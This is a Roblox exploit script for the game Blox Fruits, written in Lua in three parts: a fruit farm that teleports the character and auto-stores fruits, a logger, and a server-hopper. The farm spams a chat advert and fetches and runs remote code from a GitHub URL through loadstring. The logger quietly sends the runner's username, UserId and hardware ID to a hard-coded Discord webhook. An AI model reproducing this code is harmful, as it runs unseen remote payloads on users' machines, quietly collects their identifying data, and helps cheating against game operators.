repeat wait() until game.IsLoaded and (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()) and (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait())
if Ran then 
    return
else
    getgenv().Ran = true
end

if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main", 9e9):FindFirstChild("ChooseTeam") then
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
    wait(3)
end
local args = {
    [1] = "Blox Fruits {Devil Fruit Farm By Delux#6>6<6>6}",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))


loadstring(game:HttpGet("https://raw.githubusercontent.com/DogePR/adsdsa/main/README.md"))()


local plr = game.Players.LocalPlayer
local chr = plr.Character
local t = game.TweenService

local bv = Instance.new("BodyVelocity")
bv.MaxForce = Vector3.new(1/0, 1/0, 1/0)
bv.Velocity = Vector3.new()
bv.Name = "bV"
local bav = Instance.new("BodyAngularVelocity")
bav.AngularVelocity = Vector3.new()
bav.MaxTorque = Vector3.new(1/0, 1/0, 1/0)
bav.Name = "bAV" 

for _,v in next, workspace:GetChildren() do
    if v.Name:find("Fruit") and (v:IsA("Tool") or v:IsA("Model")) then
        repeat 
            local anc1 = bv:Clone()
            anc1.Parent = chr.HumanoidRootPart
            local anc2 = bav:Clone()
            anc2.Parent = chr.HumanoidRootPart
            local p = t:Create(chr.HumanoidRootPart, TweenInfo.new((plr:DistanceFromCharacter(v.Handle.Position)-100)/320, Enum.EasingStyle.Linear), {CFrame=v.Handle.CFrame + Vector3.new(0, v.Handle.Size.Y, 0)})
            p:Play()
            p.Completed:Wait()
            chr.HumanoidRootPart.CFrame = v.Handle.CFrame
            anc1:Destroy()
            anc2:Destroy()
            wait(1)
        until v.Parent ~= workspace
        wait(1)
        local fruit = chr:FindFirstChildOfClass("Tool") and chr:FindFirstChildOfClass("Tool").Name:find("Fruit") and chr:FindFirstChildOfClass("Tool") or (function()
            for _,fr in plr.Backpack:GetChildren() do
                if fr.Name:find("Fruit") then
                    return fr
                end 
            end
        end)()
        print(fruit)
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", fruit:GetAttribute("OriginalName"), fruit)
    end
end

print('nope')
---
HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1062446087820025856/fzxHyGrn-fBbKkEWPRj0XvfW4cctBZIpDHKS4JXy1RvnPL2xcYofpNjHyMLFwwGyTGcj"

local request = syn and syn.request or request or http and http.request or http_request
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
					{
                        ["name"] = "Player DisplayName : ",
                        ["value"] = game.Players.LocalPlayer.DisplayName,
                        ["inline"] = true
                    },
                    {
						
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "HWID Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                        ["inline"] = true
                    }, {
                        ["name"] = "Key : ",
                        ["value"] = "Hi",
                        ["inline"] = true
                    }
					
                }
            }
        }
    })
})
---
Time = 5 -- seconds
repeat wait() until game:IsLoaded()
wait(Time)
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
function TPReturner()
   local Site;
   if foundAnything == "" then
       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
   else
       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
   end
   local ID = ""
   if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
       foundAnything = Site.nextPageCursor
   end
   local num = 0;
   for i,v in pairs(Site.data) do
       local Possible = true
       ID = tostring(v.id)
       if tonumber(v.maxPlayers) > tonumber(v.playing) then
           for _,Existing in pairs(AllIDs) do
               if num ~= 0 then
                   if ID == tostring(Existing) then
                       Possible = false
                   end
               else
                   if tonumber(actualHour) ~= tonumber(Existing) then
                       local delFile = pcall(function()
                           delfile("NotSameServers.json")
                           AllIDs = {}
                           table.insert(AllIDs, actualHour)
                       end)
                   end
               end
               num = num + 1
           end
           if Possible == true then
               table.insert(AllIDs, ID)
               wait()
               pcall(function()
                   writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                   wait()
                   game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
               end)
               wait(4)
           end
       end
   end
end

function Teleport()
   while wait() do
       pcall(function()
           TPReturner()
           if foundAnything ~= "" then
               TPReturner()
           end
       end)
   end
end

-- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
Teleport()
